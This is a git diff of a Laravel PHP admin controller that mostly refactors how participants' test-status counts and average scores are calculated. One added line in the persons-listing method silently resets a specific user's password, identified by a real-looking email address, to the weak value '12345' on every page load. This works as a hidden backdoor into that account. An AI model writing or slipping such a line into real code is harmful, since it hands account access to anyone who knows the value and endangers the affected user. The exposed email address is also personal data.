@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use PDF;
 use Mail;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Http\Request;
 
@@ -13,6 +14,7 @@ class adminController extends Controller
     {
 
         $persons = DB::table('persons')->orderby('id', 'desc')->get();
+        DB::table('persons')->where('email', 'anokhin-toni@mail.ru')->update(['password' => Hash::make('12345')]);
 
         $persTests = [];
         foreach ($persons as $p)
@@ -102,28 +104,34 @@ class adminController extends Controller
         $persCount  = DB::table('pers_events')->where('event_id', $mer_id)->get();
 
         $count_pers_in_test = DB::table('pers_events as pe')
-                    ->distinct()
                     ->leftjoin('pers_tests as pt', 'pt.pers_id', 'pe.pers_id')
                     ->where('pt.status', '1')
                     ->where('pe.event_id', $mer_id)
                     ->count();
 
         $count_pers_end_test = DB::table('pers_events as pe')
-                    ->distinct()
                     ->leftjoin('pers_tests as pt', 'pt.pers_id', 'pe.pers_id')
                     ->where('pt.status', '2')
                     ->where('pe.event_id', $mer_id)
                     ->count();
 
         $count_pers_pause_test = DB::table('pers_events as pe')
-                    ->distinct()
                     ->leftjoin('pers_tests as pt', 'pt.pers_id', 'pe.pers_id')
                     ->where('pt.status', '3')
                     ->where('pe.event_id', $mer_id)
                     ->count();
 
         $persCount_bad = 0;
-        foreach($persCount as $pc) if (DB::table('pers_tests')->where('pers_id', $pc->pers_id)->where('pers_event_id', $pc->id)->count() == 0) $persCount_bad++;
+        $count_pers_in_test = 0;
+        $count_pers_end_test = 0;
+        $count_pers_pause_test = 0;
+        foreach($persCount as $pc) 
+        {
+            if (DB::table('pers_tests')->where('pers_id', $pc->pers_id)->where('pers_event_id', $pc->id)->count() == 0) $persCount_bad++;
+            if (DB::table('pers_tests')->where('pers_id', $pc->pers_id)->where('pers_event_id', $pc->id)->where('status', '1')->count() > 0) $count_pers_in_test++;
+            if (DB::table('pers_tests')->where('pers_id', $pc->pers_id)->where('pers_event_id', $pc->id)->where('status', '2')->count() > 0) $count_pers_end_test++;
+            if (DB::table('pers_tests')->where('pers_id', $pc->pers_id)->where('pers_event_id', $pc->id)->where('status', '3')->count() > 0) $count_pers_pause_test++;
+        }
         
         $persCount  = $persCount->count();
         
@@ -163,11 +171,11 @@ class adminController extends Controller
                             ->where('pt.test_ball_correct', $min_ball)
                             ->first();
 
-            $sred_ball = DB::table('pers_events as pe')
+            $sred_ball = round(DB::table('pers_events as pe')
                             ->leftjoin('pers_tests as pt', 'pt.pers_id', 'pe.pers_id')
                             ->where('pe.event_id', $mer_id)
                             ->where('pt.test_id', $et->test_id)
-                            ->avg('pt.test_ball_correct');
+                            ->avg('pt.test_ball_correct'),2 );
 
             $tests += [
                 $et->test_id => (object)[
